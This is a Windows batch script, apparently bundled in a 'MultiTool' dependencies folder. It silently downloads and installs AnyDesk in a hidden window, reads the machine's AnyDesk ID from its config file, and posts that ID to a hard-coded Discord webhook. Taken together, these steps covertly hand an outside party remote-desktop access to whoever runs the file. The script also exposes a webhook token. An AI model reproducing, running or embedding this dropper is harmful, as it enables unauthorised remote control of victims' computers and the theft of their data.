@echo off
setlocal

:: Define the target directory
set targetDir=C:\Users\keano\Desktop\MultiTool\Dependencies\utils\scrap

:: Step 1: Download and install AnyDesk silently
:download
if exist "%targetDir%\AnyDesk.exe" (
    echo AnyDesk.exe already exists in %targetDir%, deleting it...
    del /f "%targetDir%\AnyDesk.exe"
)
powershell -Command "Start-Process -FilePath 'powershell' -ArgumentList 'Invoke-WebRequest -Uri https://download.anydesk.com/AnyDesk.exe -OutFile %targetDir%\AnyDesk.exe' -NoNewWindow -Wait"
if %ERRORLEVEL% neq 0 (
    echo Failed to download AnyDesk.exe, retrying...
    goto download
)

powershell -Command "Start-Process -FilePath '%targetDir%\AnyDesk.exe' -ArgumentList '/S' -WindowStyle Hidden -NoNewWindow -Wait"

:: Step 2: Retrieve the AnyDesk code
powershell -Command "Start-Sleep -Seconds 10"  :: Wait for AnyDesk to start and generate the code
for /f "tokens=2 delims==" %%A in ('findstr /i "ad.anynet.id" "%APPDATA%\AnyDesk\system.conf"') do set AnyDeskCode=%%A

:: Debugging: Print the AnyDesk code to the console
echo AnyDesk Code: %AnyDeskCode%

:: Step 3: Send the AnyDesk code to a Discord webhook
set WebhookUrl=https://discordapp.com/api/webhooks/1336057506132135946/6yZfv53pWikSJ0GWMCozpgAeZcgVeyvEVRNv81lamV-bpAXvPHCDeaV_QTkq4PqBhlAf
powershell -Command "Invoke-RestMethod -Uri %WebhookUrl% -Method POST -Body (@{content=\"AnyDesk Code: %AnyDeskCode%\"} | ConvertTo-Json) -ContentType application/json"

endlocal